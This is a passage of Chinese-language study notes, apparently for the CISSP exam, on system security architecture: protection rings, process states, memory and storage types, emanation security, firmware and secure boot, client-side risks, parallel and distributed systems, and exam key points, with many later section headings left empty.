最内层的环，环 0 具有最高级别权限，基本可以访问任何资源、文件和内存位置。操作系统内核部分始终驻留在内存中。</p><p><strong>环 1： 其他操作系统组件</strong>是操作系统的非内核部分（各种被请求的任务、被执行的操作、被切换的进程等进出内存的部分）占用。</p><p><strong>环 2 ：驱动程序</strong>是 I&#x2F;O 驱动程序和系统实用程序驻留的地方，能访问应用和其他程序本身无法直接访问的外围设备、特殊文件等。</p><p><strong>环 3 ：用户层面的程序和应用</strong> - 是应用程序和其他程序占用。</p><p>内核（kernel mode）模式&#x2F;特权（privileged mode）模式：系统层面访问，也就是环0-环2</p><p>用户（user mode）模式：用户层面的程序和应用，也就是环 3 </p><p>系统调用：编号较高的环中运行的进程通常必须向编号较低环中的处理程序或驱动程序请求他们所需要的服务。</p><h4 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h4><p>进程状态（process state）也叫操作状态（operating state），是指进程运行的各种执行形式。</p><p>操作系统任何时刻都处于以下两种模式之一</p><p>管理程序状态 supervisor state：以被授予权限、可完全访问模式运行</p><p>问题状态 problem state：在与用户模式下运行，权限较低，所有访问请求必须经过授权凭证检查才会被准许或拒绝</p><h5 id="就绪状态"><a href="#就绪状态" class="headerlink" title="就绪状态"></a>就绪状态</h5><p>就绪状态（ ready state ）是指进程已经做好准备，被安排执行时可立即恢复或开始处理。</p><h5 id="运行状态"><a href="#运行状态" class="headerlink" title="运行状态"></a>运行状态</h5><p>运行状态（running state）是指进程在CPU上执行并持续运行的状态，直到完成运行或时间片用完（进入就绪状态）或被阻塞（通常是等待IO，进入等待状态）</p><h5 id="等待状态"><a href="#等待状态" class="headerlink" title="等待状态"></a>等待状态</h5><p>等待状态（waiting state）是指已准备好继续执行，只等待IO完成后，进入就绪状态</p><h5 id="管理程序状态"><a href="#管理程序状态" class="headerlink" title="管理程序状态"></a>管理程序状态</h5><p>是指进程执行的操作，要求高权限（包括修改系统配置、安装设备驱动程序、修改安全配置等）时，进程进入管理程序状态。</p><p>也可以说，不在用户模式（环 3 ）下的任何功能基本上都会在管理程序模式下执行。</p><h5 id="停止状态"><a href="#停止状态" class="headerlink" title="停止状态"></a>停止状态</h5><p>停止状态（stopped state）是指当进程结束或必须终止（因为发生错误、需要的资源不可用、某项资源请求无法满足）时，进入停止状态，操作系统将回收分配给该进程的所有内存和资源。</p><p><img src="/image-20250210200058664.png" alt="image-20250210200058664"></p><h3 id="操作模式"><a href="#操作模式" class="headerlink" title="操作模式"></a>操作模式</h3><h5 id="用户模式"><a href="#用户模式" class="headerlink" title="用户模式"></a>用户模式</h5><p>用户模式是 CPU 在执行用户应用程序时使用的基本模式，只允许执行其全部指令集 中的部分指令。</p><h5 id="特权模式"><a href="#特权模式" class="headerlink" title="特权模式"></a>特权模式</h5><p>特权模式是  CPU 可以访问CPU支持的所有指令，也被称为管理程序模式、系统模式或内核模式。</p><p>注意：</p><p>所有用户（包括系统管理员）的应用程序都以用户模式运行。</p><h3 id="存储器"><a href="#存储器" class="headerlink" title="存储器"></a>存储器</h3><h4 id="只读存储器-ROM"><a href="#只读存储器-ROM" class="headerlink" title="只读存储器 ROM"></a>只读存储器 ROM</h4><p>只读存储器（read-only  memory，ROM）是可以读取但不能更改（不允许写入）的存储器。通常包含“引导”信息，引导计算器启动。引导程序包含每次引导运行时的开机自检（power-on self-test，POST）系列诊断。</p><h5 id="可编程只读存储器"><a href="#可编程只读存储器" class="headerlink" title="可编程只读存储器"></a>可编程只读存储器</h5><p>可编程只读存储器（programmable read-only memory，PROM）</p><p>允许日后写入，写入后无法修改</p><h5 id="可擦除可编程只读存储器"><a href="#可擦除可编程只读存储器" class="headerlink" title="可擦除可编程只读存储器"></a>可擦除可编程只读存储器</h5><p>可擦除PROM（erasable PROM，EPROM）</p><p>分为两类：</p><p>紫外线擦除EPROM（ultraviolet EPROM，UVEPROM）通过紫外线光照射擦除</p><p>电子可擦除EPROM（electronically erasable PROM，EEPROM），通过传递到芯脚的电压强制擦除。</p><h5 id="电子可擦除可编程只读存储器"><a href="#电子可擦除可编程只读存储器" class="headerlink" title="电子可擦除可编程只读存储器"></a>电子可擦除可编程只读存储器</h5><p>电子可擦除EPROM（electronically erasable PROM，EEPROM），通过传递到芯脚的电压强制擦除。</p><p>相对UVEPROM会更加灵活友好。</p><h5 id="闪存"><a href="#闪存" class="headerlink" title="闪存"></a>闪存</h5><p>闪存（flash memory）EEPROM的衍生概念。</p><p>一种非易失性存储介质，可以通过电子方式擦除和重写。</p><p>与EEPROM区别：</p><p>EEPROM必须完全擦除后重写</p><p>闪存可以按块擦除重写</p><p>NAND闪存是常见的闪存类型，广泛用于存储卡、优盘、移动硬盘和固态硬盘SSD</p><h4 id="随机存取存储器-RAM"><a href="#随机存取存储器-RAM" class="headerlink" title="随机存取存储器 RAM"></a>随机存取存储器 RAM</h4><p>随机存取存储器（random access memory，RAM）属于可读写存储器。</p><p>RAM只能临时存储数据，只在供电期间保留数据。</p><h5 id="真实内存"><a href="#真实内存" class="headerlink" title="真实内存"></a>真实内存</h5><p>真实内存（real memory）也叫主内存（main memory or  primary memory）</p><p>多个动态芯片构成，一般为计算机最大可用RAM资源，必须由CPU定期刷新。</p><h5 id="高速缓存-RAM"><a href="#高速缓存-RAM" class="headerlink" title="高速缓存 RAM"></a>高速缓存 RAM</h5><p>高速缓存（cache RAM）是将数据从较慢的存储介质读取临时存储在较快的存储介质中，以提高性能。</p><p>高速缓存也被称为L1、L2、L3和L4缓存（L代表级别）</p><p>L1和L2常专门用于单个处理器内核。</p><p>L3常用于内核间共享的高速缓存。</p><p>L4常被安装在主板或GPU（图形处理单元）上。</p><p>硬盘驱动器HDD、固态硬盘SSD和某些U盘，也会包含高速缓存。</p><h6 id="动态RAM和静态RAM"><a href="#动态RAM和静态RAM" class="headerlink" title="动态RAM和静态RAM"></a>动态RAM和静态RAM</h6><p><strong>动态RAM</strong>使用电容器，电容器保持电荷代表1，电容器不包持电荷代表0，电容器会随着时间放电，需要CPU刷新动态RAM的内容，避免内容发生变化。</p><p><strong>静态RAM</strong>使用逻辑装置触发器，是一个通过切换位置改变比特0 1 的开关，只要不断电，静态存储器就会保持内部不变，不需要CPU刷新。</p><h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h4><p>寄存器（register）处于CPU中，其在CPU中的数量有限，可以为算数逻辑单元（arithmetic-logical unit，ALU）提供执行计算或处理指令时可直接访问的存储位置。</p><p>寄存器的大小和数量会因为系统的不同而异。</p><p>CPU一般有8-32个寄存器，大小一般是32位或64位。</p><p>优点：</p><p>寄存器是 ALU 的一部分，会以典型的CPU速度与CPU同步调用允许。</p><h4 id="内存寻址"><a href="#内存寻址" class="headerlink" title="内存寻址"></a>内存寻址</h4><p>处理器在使用内存资源时必须通过内存寻址（memory addressing）来关联内存的各个位置。</p><h5 id="寄存器寻址"><a href="#寄存器寻址" class="headerlink" title="寄存器寻址"></a>寄存器寻址</h5><p>当CPU需要用一个寄存器中的信息来完成某项操作时，会按寄存器地址来访问寄存器内容。</p><h5 id="立即寻址"><a href="#立即寻址" class="headerlink" title="立即寻址"></a>立即寻址</h5><p>立即寻址（immediate addressing）是一种关联数据的方式，数据作为指令的组成部分被提供给CPU。</p><h5 id="直接寻址"><a href="#直接寻址" class="headerlink" title="直接寻址"></a>直接寻址</h5><p>直接寻址（direct addressing）中，CPU将获得访问的内存位置的一个实际地址，该地址必须要与正在执行指令在同一个内存页面上。</p><h5 id="间接寻址"><a href="#间接寻址" class="headerlink" title="间接寻址"></a>间接寻址</h5><p>间接寻址（indirect addressing）中，CPU获得的不是实际数值的内存地址，而是一个存储实际数值地址的地址。</p><h5 id="基址-偏移量寻址"><a href="#基址-偏移量寻址" class="headerlink" title="基址+偏移量寻址"></a>基址+偏移量寻址</h5><p>基址+偏移量寻址（base + offset addressing）中，CPU使用保存在寄存器或指针中的数值作为基本地址，通过把指令中的和基本地址相加，获取实际数值的地址。</p><h4 id="二级内存"><a href="#二级内存" class="headerlink" title="二级内存"></a>二级内存</h4><p>二级内存（secondary memory）是指磁性、光学或基于闪存的介质或其他存储设备，CPU不能直接读取，需要操作系统先加载到真实内存中，CPU再使用。</p><p>虚拟内存（virtual memory）是一种特殊的二级内存，用于扩展真实内存的可寻址空间。</p><p>常见虚拟内存类型：</p><p>1、页面文件（pagefile）</p><p>2、交换文件（swapfile）</p><p>CPU需要访问虚拟内存中的数据时，会先检查是否驻留在内存中（可以直接访问），如果已经交换到硬盘中，会进行分页操作。</p><p>操作系统把数据从硬盘读取到真实内存的过程，叫做分页。</p><p>缺点：</p><p>主内存和二级内存之间交换数据时分页操作速度相对较慢。</p><h3 id="数据存储设备"><a href="#数据存储设备" class="headerlink" title="数据存储设备"></a>数据存储设备</h3><p>数据存储设备（data storage device）用于存储被写入计算机可随时使用的信息。</p><h4 id="主存储设备与辅助存储设备"><a href="#主存储设备与辅助存储设备" class="headerlink" title="主存储设备与辅助存储设备"></a>主存储设备与辅助存储设备</h4><p>主存储设备也称为主内存，是指被计算机用来在允许过程中保存随时可以供CPU使用信息的RAM。</p><p>辅助存储设备也称为二级内存，由磁性和光学介质组成，常见的有硬盘驱动器（HDD）、固态硬盘（SSD）、闪存驱动器、磁带、CD、DVD和闪存卡等。</p><h4 id="易失性存储设备与非易失性存储设备"><a href="#易失性存储设备与非易失性存储设备" class="headerlink" title="易失性存储设备与非易失性存储设备"></a>易失性存储设备与非易失性存储设备</h4><p>存储的易失性判断标准是在断电时数据丢失可能性。</p><p>非易失的是长期可以保存数据的设备，例如：磁性介质、光学介质和ROM。</p><p>易失的是断电后丢失数据的设备，例如：静态RAM模块、动态RAM模块。</p><h4 id="随机存取与顺序存取"><a href="#随机存取与顺序存取" class="headerlink" title="随机存取与顺序存取"></a>随机存取与顺序存取</h4><p>随机存取存储设备（random access storage），允许操作系统通过某种类型的寻址方式直接从设备任意位置读取或写入数据，几乎所有的主存储器都是随机存取存储设备。</p><p>顺序存取存储设备（sequential storage），要求操作系统读取指定位置数据之前需要读取之前所有数据，磁带就是顺序存取存储设备。</p><h4 id="存储器的安全问题"><a href="#存储器的安全问题" class="headerlink" title="存储器的安全问题"></a>存储器的安全问题</h4><p>1、断电后依然保留数据的介质需要注意，包括不限于二级内存、ROM、PROM、EPROM、EEPROM等。</p><p>2、易失性设备在断电后的一段时间内依然保留一部分电量，存在利用这些电量恢复数据的可能性。</p><p>3、冷启动攻击：在系统关机或RAM从主机拔出时冻结芯片减少数据衰减；内存映像转储和系统奔溃转储攻击获取加密密钥。</p><h3 id="存储介质的安全"><a href="#存储介质的安全" class="headerlink" title="存储介质的安全"></a>存储介质的安全</h3><p>1、数据被擦除后任然有可能保留在辅助存储设备上，也就是数据残留（data remanence），数据从硬盘被删除或者硬盘被格式化，也有程序可以从硬盘恢复数据。</p><p>解决方案：使用专门程序覆盖硬盘所有痕迹（也叫净化）或者损坏、销毁设备本身，导致其不能恢复。</p><p>2、传统的归零擦除对SSD效果不佳，因为怀块可能不会覆盖到。</p><p>SSD作为大容量闪存辅助存储设备，会存在用于坏块替换的备用内存块。</p><p>SSD针对故障率，一般采用两种方式，第一种是故障的内存块标记为坏块，使用备用块，另一种是在所有的块上均匀的写入和擦除，尽可能提供使用寿命。</p><p>3、辅助存储设备存在失窃风险</p><p>解决方案：辅助存储设备本身实施全盘加密，常见的HDD、SSD和闪存本身存在加密功能。</p><p>4、可移动介质存在很大信息泄漏风险，需要通过加密技术确保安全。</p><h4 id="发射安全"><a href="#发射安全" class="headerlink" title="发射安全"></a>发射安全</h4><p>许多设备发射的电信号或辐射（WI-FI、蓝牙、GPS和移动电话信号）都存在被拦截窃取敏感信息的风险。</p><p>攻击手段</p><p>1、TEMPEST窃听</p><p>2、Van Eck偷听（Van Eck Phreaking）</p><p>TEMPEST的衍生技术，可以从远处窃取设备产生的辐射信息</p><p>防御手段</p><p>1、法拉第笼（Faraday cage）</p><p>给盒子、可移动的房间或整个建筑包裹一层金属丝网，将其全方面包裹。</p><p>2、白噪声（white noise）</p><p>指通过广播假通信流来掩盖和隐藏真实信号辐射的存在。</p><p>3、控制区（control zone）</p><p>对某个区域同时使用法拉第笼和白噪声，其他区域不受限制。</p><h3 id="输入和输出设备"><a href="#输入和输出设备" class="headerlink" title="输入和输出设备"></a>输入和输出设备</h3><h4 id="显示器"><a href="#显示器" class="headerlink" title="显示器"></a>显示器</h4><p>TEMPEST 技术可以用来危害显示器展示的数据安全。</p><p>传统阴极射线管（CRT）显示器更容易产生辐射。</p><p>现代的液晶显示器（LCD）、发光二极管（LED）、有机发光二极管（OLED）和量子点发光二极管（QLED）也会产生少量辐射。</p><p>最大风险为肩窥，肉眼或摄像机偷看屏幕内容。</p><h4 id="打印机"><a href="#打印机" class="headerlink" title="打印机"></a>打印机</h4><p>带走打印出来的敏感信息或许要比用 闪存盘或磁性介质带走敏感信息容易得多。</p><h4 id="键盘-鼠标"><a href="#键盘-鼠标" class="headerlink" title="键盘&#x2F;鼠标"></a>键盘&#x2F;鼠标</h4><p>受到TEMPEST影响</p><h4 id="调制解调器"><a href="#调制解调器" class="headerlink" title="调制解调器"></a>调制解调器</h4><p>1、评估业务是否需要完全禁用调制解调器</p><p>2、确保调制解调器在网络中的物理和逻辑位置</p><h2 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h2><p>固件（firmware）也称为微码（miscrocode），存储在ROM芯片中的软件。</p><p>固件通常用于移动设备、物联网设备、边缘计算设备、雾计算设备和工业控制系统。</p><p>BIOS，基本输入输出系统（base input&#x2F;output system）是镶嵌在主板EEPROM或闪存芯片上的传统固件。</p><p>包含计算机启动和从磁盘加载操作系统时所需的独立于操作系统的原始指令。</p><p>UEFI，统一可扩展固件接口（unified extensible firmware interface）用于取代BIOS，支持BIOS所有功能，缩短了启动时间，增加了安全性能。</p><p>刷新（flashing）是更新 UEFI 、BIOS或固件的过程。如果恶意软件或人员可以更改UEFI、BIOS或固件，则就存在绕过相关安全机制实施攻击。</p><p>UEFI存在引导认证（boot attestation）或安全引导（secure boot）功能，确保只有通过认证（通过核查数字签名方式完成验证和批准过程）的驱动程序或操作系统可以安装和加载到本地系统上。</p><p>UEFI存在可选的测量启动（measured boot）功能，对启动进程中的每个元素进行哈希计算。哈希计算由可信平台模块（TPM）执行并将结果记录在该模块中。测量启动不会干扰和中断启动进程，只是记录启动过程中涉及每个元素的哈希ID。</p><h1 id="9-3基于客户端的系统"><a href="#9-3基于客户端的系统" class="headerlink" title="9.3基于客户端的系统"></a>9.3基于客户端的系统</h1><p>客户端攻击是指会对客户端造成伤害的任何攻击，该类攻击是以客户端为目标。</p><p>常见的风险：</p><p>1、通过恶意网址将恶意移动代码（applet）传输给客户端上运行的脆弱浏览器。</p><p>不局限于HTTP协议，可以发生在任何通信协议上。</p><p>2、本地缓存中毒的风险。</p><h2 id="9-3-1移动代码-applet"><a href="#9-3-1移动代码-applet" class="headerlink" title="9.3.1移动代码 applet"></a>9.3.1移动代码 applet</h2><p>applet 是服务器发送给客户端用来执行某些操作的代码对象。</p><p>常见的 applet ：Java applet（甲骨文）、Active X（微软）和flash</p><p>嵌入式代码javascript存在同样的风险。</p><p>解决方案：</p><p>1、实时更新浏览器（客户端）</p><p>2、执行javascript子集（如 ADsafe、Secure ECMAScript或Caja）（服务端）</p><p>3、落实内容安全策略，执行同源策略</p><p>4、Web应用防火墙（WAF）和下一代防火墙（NGFW）</p><p>5、插件、浏览器辅助对象（BHO）和扩展来降低javascript风险，例如：用于 Mozilla Firefox的 NoScript、用于（基于chromium的）Chrome和Edge的UBlock Origin </p><h2 id="9-3-2本地缓存"><a href="#9-3-2本地缓存" class="headerlink" title="9.3.2本地缓存"></a>9.3.2本地缓存</h2><p>常见本地缓存有 DNS缓存、ARP缓存和临时互联网文件。</p><p>临时互联网文件（temporary Internet file）或互联网文件缓存（Internet files cache）是从互联网下载的文件临时存储，通常由客户端使用程序浏览器保存，以供当前和将来使用。</p><p>风险点：</p><p>1、DOM XSS 可以访问本地缓存文件并用它们来执行恶意代码或泄漏数据。</p><p>2、移动代码脚本攻击给缓存植入虚假内容。</p><p>解决方案：</p><p>1、配置缓存，使其只在短时间内保留文件，从而最大限度地缩小缓存。</p><p>2、禁用预加载内容。</p><p>3、配置浏览器在退出时删除所有cookie和缓存、配置自动清除程序，按计划或者在目标程序关闭时清楚临时互联网文件。</p><h1 id="9-4基于服务器端的系统"><a href="#9-4基于服务器端的系统" class="headerlink" title="9.4基于服务器端的系统"></a>9.4基于服务器端的系统</h1><p>关注要点：数据流控制（data flow control）的问题。</p><p>数据流：数据在进程之间、设备之间、网络之间和通信信道之间的流转。</p><p>数据流管理要点：</p><p>1、确保最小延迟和时延高效传输</p><p>2、确保通过加密实现哈希计算和保密性实现可靠的吞吐量</p><p>3、确保接收系统不会因通信流过载。</p><p>数据流管理设备：</p><p>1、路由器&#x2F;交换机等联网设备</p><p>2、网络应用和服务</p><h2 id="9-4-1大规模并行数据系统"><a href="#9-4-1大规模并行数据系统" class="headerlink" title="9.4.1大规模并行数据系统"></a>9.4.1大规模并行数据系统</h2><p>并行数据系统（parallel data system）或并行计算（parallel computing）是一种同时执行大量计算的计算系统。</p><p>通过把大型任务划分为较小的元素，每个子元素分配给不同的处理子系统并行计算。</p><p>对于大规模并行数据系统（large-sacle parallel data system）需要关注性能、功耗和可靠性&#x2F;稳定性问题。</p><p>多处理或并行处理领域分支：</p><p>1、对称多处理（SMP）</p><p>单台计算机的多个处理器被单一操作系统同等地对待和控制的场景称为对称多处理（symmetric multiprocessing，SMP）。</p><p>各个处理器共享单一公共操作系统、单一公共数据总线和内存资源。</p><p>2、非对称多处理（AMP）</p><p>单台计算机的多个处理器彼此独立工作，每个处理器有自己的操作系统、任务指令集以及专用的数据总线和内存资源的场景称为非对称多处理（asymmetric multiprocessing，AMP）。</p><p>AMP存在变体叫大规模并行处理（massive parallel processing，MPP），大量AMP系统被链接在一起，多个进程共同处理一项主任务。</p><p>SMP系统擅长以极高速度处理简单操作。</p><p>MPP系统擅长处理极其庞大、复杂且计算极其密集的任务。</p><h2 id="9-4-2网格系统"><a href="#9-4-2网格系统" class="headerlink" title="9.4.2网格系统"></a>9.4.2网格系统</h2><p>网格计算（grid computing）是一种并行分布式处理形式，对大量处理节点进行松散的分组，使其共同去实现一个特定处理目标。</p><p>网格成员可以随机进入和离开网格。</p><p>安全问题：</p><p>1、每个工作包的内容都有暴露给外界的可能，许多网格计算项目对全世界开放。</p><p>网格项目不太可能保守秘密，因此不适用于隐私、保密或专有数据。</p><p>2、存在中央网格服务器被入侵，攻击网格成员或欺骗网格成员执行非网格社区预期目的的恶意操作。</p><h2 id="9-4-3对等系统"><a href="#9-4-3对等系统" class="headerlink" title="9.4.3对等系统"></a>9.4.3对等系统</h2><p>对等网络（peer-to-peer，P2P）技术是在伙伴之间共享任务和工作负载的联网和分布式应用解决方案。</p><p>与网格计算区别：P2P没有中央管理系统，通常实时提供服务，不是能力计算的集合。</p><p>常见P2P实例：</p><p>1、VoIP服务</p><p>2、BitTorrent（用于数据&#x2F;文件分发）</p><p>3、简化音频&#x2F;音乐分发的工具</p><p>安全问题：</p><p>1、版权问题</p><p>2、窃听分布式内容</p><p>3、服务耗尽可用带宽的可能性</p><h1 id="9-5工业控制系统"><a href="#9-5工业控制系统" class="headerlink" title="9.5工业控制系统"></a>9.5工业控制系统</h1><p>工业控制系统（industrial control system，ICS）是一种控制工业流程和机器的计算机管理设备，也叫操作技术（operational technology，OT）。</p><p>存在多种形式：</p><p>1、分布式控制系统（distributed control system，DCS）</p><p>2、可编程逻辑控制器（programmable logic controller，PLC）</p><p>3、监测控制和数据采集（supervisory control and data acquisition，SCADA）系统</p><h1 id="9-6分布式系统"><a href="#9-6分布式系统" class="headerlink" title="9.6分布式系统"></a>9.6分布式系统</h1><h1 id="9-7高性能系统"><a href="#9-7高性能系统" class="headerlink" title="9.7高性能系统"></a>9.7高性能系统</h1><h1 id="9-8物联网"><a href="#9-8物联网" class="headerlink" title="9.8物联网"></a>9.8物联网</h1><h1 id="9-9边缘和雾计算"><a href="#9-9边缘和雾计算" class="headerlink" title="9.9边缘和雾计算"></a>9.9边缘和雾计算</h1><h1 id="9-10嵌入式设备和信息物理融合系统"><a href="#9-10嵌入式设备和信息物理融合系统" class="headerlink" title="9.10嵌入式设备和信息物理融合系统"></a>9.10嵌入式设备和信息物理融合系统</h1><h2 id="9-10-1静态系统"><a href="#9-10-1静态系统" class="headerlink" title="9.10.1静态系统"></a>9.10.1静态系统</h2><h2 id="9-10-2可联网设备"><a href="#9-10-2可联网设备" class="headerlink" title="9.10.2可联网设备"></a>9.10.2可联网设备</h2><h2 id="9-10-3信息物理融合系统"><a href="#9-10-3信息物理融合系统" class="headerlink" title="9.10.3信息物理融合系统"></a>9.10.3信息物理融合系统</h2><h2 id="9-10-4与嵌入式和静态系统相关的元素"><a href="#9-10-4与嵌入式和静态系统相关的元素" class="headerlink" title="9.10.4与嵌入式和静态系统相关的元素"></a>9.10.4与嵌入式和静态系统相关的元素</h2><h2 id="9-10-5嵌入式和静态系统的安全问题"><a href="#9-10-5嵌入式和静态系统的安全问题" class="headerlink" title="9.10.5嵌入式和静态系统的安全问题"></a>9.10.5嵌入式和静态系统的安全问题</h2><h1 id="9-11专用设备"><a href="#9-11专用设备" class="headerlink" title="9.11专用设备"></a>9.11专用设备</h1><h1 id="9-12微服务"><a href="#9-12微服务" class="headerlink" title="9.12微服务"></a>9.12微服务</h1><h1 id="9-13基础设施即代码"><a href="#9-13基础设施即代码" class="headerlink" title="9.13基础设施即代码"></a>9.13基础设施即代码</h1><h1 id="9-14虚拟化系统"><a href="#9-14虚拟化系统" class="headerlink" title="9.14虚拟化系统"></a>9.14虚拟化系统</h1><h2 id="9-14-1虚拟软件"><a href="#9-14-1虚拟软件" class="headerlink" title="9.14.1虚拟软件"></a>9.14.1虚拟软件</h2><h2 id="9-14-2虚拟网络"><a href="#9-14-2虚拟网络" class="headerlink" title="9.14.2虚拟网络"></a>9.14.2虚拟网络</h2><h2 id="9-14-3软件定义一切"><a href="#9-14-3软件定义一切" class="headerlink" title="9.14.3软件定义一切"></a>9.14.3软件定义一切</h2><h2 id="9-14-4虚拟化的安全管理"><a href="#9-14-4虚拟化的安全管理" class="headerlink" title="9.14.4虚拟化的安全管理"></a>9.14.4虚拟化的安全管理</h2><h1 id="9-15容器化"><a href="#9-15容器化" class="headerlink" title="9.15容器化"></a>9.15容器化</h1><h1 id="9-16无服务器架构"><a href="#9-16无服务器架构" class="headerlink" title="9.16无服务器架构"></a>9.16无服务器架构</h1><h1 id="9-17移动设备"><a href="#9-17移动设备" class="headerlink" title="9.17移动设备"></a>9.17移动设备</h1><h2 id="9-17-1移动设备的安全性能"><a href="#9-17-1移动设备的安全性能" class="headerlink" title="9.17.1移动设备的安全性能"></a>9.17.1移动设备的安全性能</h2><h2 id="9-17-2移动设备的部署策略"><a href="#9-17-2移动设备的部署策略" class="headerlink" title="9.17.2移动设备的部署策略"></a>9.17.2移动设备的部署策略</h2><h1 id="9-18基本安全保护机制"><a href="#9-18基本安全保护机制" class="headerlink" title="9.18基本安全保护机制"></a>9.18基本安全保护机制</h1><h2 id="9-18-1进程隔离"><a href="#9-18-1进程隔离" class="headerlink" title="9.18.1进程隔离"></a>9.18.1进程隔离</h2><h2 id="9-18-2硬件分隔"><a href="#9-18-2硬件分隔" class="headerlink" title="9.18.2硬件分隔"></a>9.18.2硬件分隔</h2><h2 id="9-18-3系统安全策略"><a href="#9-18-3系统安全策略" class="headerlink" title="9.18.3系统安全策略"></a>9.18.3系统安全策略</h2><h1 id="9-19常见的安全架构缺陷和问题"><a href="#9-19常见的安全架构缺陷和问题" class="headerlink" title="9.19常见的安全架构缺陷和问题"></a>9.19常见的安全架构缺陷和问题</h1><h2 id="9-19-1隐蔽通道"><a href="#9-19-1隐蔽通道" class="headerlink" title="9.19.1隐蔽通道"></a>9.19.1隐蔽通道</h2><h2 id="9-19-2基于设计或编码缺陷的攻击"><a href="#9-19-2基于设计或编码缺陷的攻击" class="headerlink" title="9.19.2基于设计或编码缺陷的攻击"></a>9.19.2基于设计或编码缺陷的攻击</h2><h2 id="9-19-3rootkit"><a href="#9-19-3rootkit" class="headerlink" title="9.19.3rootkit"></a>9.19.3rootkit</h2><h2 id="9-19-4增量攻击"><a href="#9-19-4增量攻击" class="headerlink" title="9.19.4增量攻击"></a>9.19.4增量攻击</h2><h1 id="9-20本章总结"><a href="#9-20本章总结" class="headerlink" title="9.20本章总结"></a>9.20本章总结</h1><h1 id="9-21考试要点"><a href="#9-21考试要点" class="headerlink" title="9.21考试要点"></a>9.21考试要点</h1><h2 id="了解共担责任"><a href="#了解共担责任" class="headerlink" title="了解共担责任"></a>了解共担责任</h2><p>安全设计原则表明任何机构都不是孤立运行的。</p><p>既然我们参与共担责任，就必须利用安全设计原则来研究、实施和管理工程过程。</p><h2 id="多任务处理、多核、多重处理、多程序设计和多线程之间的差异"><a href="#多任务处理、多核、多重处理、多程序设计和多线程之间的差异" class="headerlink" title="多任务处理、多核、多重处理、多程序设计和多线程之间的差异"></a>多任务处理、多核、多重处理、多程序设计和多线程之间的差异</h2><p>多任务处理是在一台计算机上同时执行多个应用程序并由操作系统实施管理。</p><p>多核是指一个CPU内存在多个执行内核。</p><p>多重处理是用多个处理器来提高计算能力。</p><p>多程序设计是指由操作系统进行协调，假性地在单个处理器上同时执行两个任务，以提高操作效率。</p><p>多线程是指允许在一个进程中执行多个并发任务。</p><h2 id="了解保护环概念"><a href="#了解保护环概念" class="headerlink" title="了解保护环概念"></a>了解保护环概念</h2><p>保护环把操作系统中的代码和组件组织成同心环。</p><p>在圆环内所处的位置越深，与占用特定环的相关代码级别就越高。</p><h2 id="了解进程状态"><a href="#了解进程状态" class="headerlink" title="了解进程状态"></a>了解进程状态</h2><p>进程就绪</p><p>进程运行</p><p>进程等待</p><p>进程管理程序</p><p>进程停止</p><h2 id="描述存储器不同类型"><a href="#描述存储器不同类型" class="headerlink" title="描述存储器不同类型"></a>描述存储器不同类型</h2><p>ROM是非易失性，不可由最终用户写入。</p><p>数据只能写入PROM芯片一次。</p><p>EPROM和UVEPROM芯片可用紫外线擦除。</p><p>EEPROM可用电流擦除。</p><p>RAM是易失性的，关机后数据会丢失。</p><h2 id="了解存储器组件相关安全问题"><a href="#了解存储器组件相关安全问题" class="headerlink" title="了解存储器组件相关安全问题"></a>了解存储器组件相关安全问题</h2><p>断电后数据依然会存在芯片上。</p><p>多用户系统存储器访问权限控制问题。</p><h2 id="了解内存寻址概念"><a href="#了解内存寻址概念" class="headerlink" title="了解内存寻址概念"></a>了解内存寻址概念</h2><p>寄存器寻址</p><p>立即寻址</p><p>直接寻址</p><p>间接寻址</p><p>基址+偏移量寻址</p><h2 id="描述计算机所用存储设备不同特征"><a href="#描述计算机所用存储设备不同特征" class="headerlink" title="描述计算机所用存储设备不同特征"></a>描述计算机所用存储设备不同特征</h2><p>主存储设备就是内存。</p><p>辅助存储设备由磁性、光介质和闪存组成，保存的数据必须先读入主存储设备，才能被CPU使用。</p><p>随机存储设备可以读取任何点。</p><p>顺序存储设备必须读取存储在预期点之前的所有数据。</p><h2 id="了解存储设备类型的变体"><a href="#了解存储设备类型的变体" class="headerlink" title="了解存储设备类型的变体"></a>了解存储设备类型的变体</h2><p>主存储设备&#x2F;复制存储设备</p><p>易失性存储&#x2F;非易失性存储</p><p>随机存储&#x2F;顺序存储</p><h2 id="了解辅助存储设备的安全问题"><a href="#了解辅助存储设备的安全问题" class="headerlink" title="了解辅助存储设备的安全问题"></a>了解辅助存储设备的安全问题</h2><p>可移动存储介质可用来窃取数据。</p><p>必须采取访问控制和加密手段保护存储的数据。</p><p>删除文件或格式化设备数据可能依然会保留在介质中。</p><h2 id="了解发射安全"><a href="#了解发射安全" class="headerlink" title="了解发射安全"></a>了解发射安全</h2><p>许多电气设备发出的电信号或辐射是可以被未经授权者捕获，这些信息可能包含敏感、保密和隐私信息。</p><p>应对Van Eck（窃听）的方案有法拉第笼、白噪音、控制区和屏蔽。</p><h2 id="了解输入和输出设备可能带来的安全风险"><a href="#了解输入和输出设备可能带来的安全风险" class="headerlink" title="了解输入和输出设备可能带来的安全风险"></a>了解输入和输出设备可能带来的安全风险</h2><p>输入&#x2F;输出设备容易被人搭线窃听、从背后偷 窥，用来把数据带出单位，或用于创建进入机构系统和网络的未经授权的不安全入口点。应 采取防范措施来识别并弥补这些漏洞。</p><h2 id="了解固件的用途"><a href="#了解固件的用途" class="headerlink" title="了解固件的用途"></a>了解固件的用途</h2><p>固件是存储在ROM芯片上的软件。</p><p>包含计算机启动的所需要的基本指令。</p><p>固件还可用在打印机等外围设备中提供指令。</p><p>例子：BIOS、UEFI</p><h2 id="了解javascript的问题"><a href="#了解javascript的问题" class="headerlink" title="了解javascript的问题"></a>了解javascript的问题</h2><p>javascript 是世界上应用最为广泛的脚本语言，被嵌入在HTML中。</p><p>无论何时，只要允许未知且不可信来源的代码运行在系统之上，便将系统保留在风险之下。</p><h2 id="了解大规模并行数据系统"><a href="#了解大规模并行数据系统" class="headerlink" title="了解大规模并行数据系统"></a>了解大规模并行数据系统</h2><p>在设计上可以同时执行大量计算的系统，包括SMP、AMP和MPP。</p><p>网格计算是一种并行分布式处理形式，对大量的节点进行松散的分组，以共同实施一个特定的目标。</p><p>对等网络（P2P）技术是在伙伴间共享任务和工作负载的联网和分布式应用解决方案。</p><h2 id="要能定义ISC"><a href="#要能定义ISC" class="headerlink" 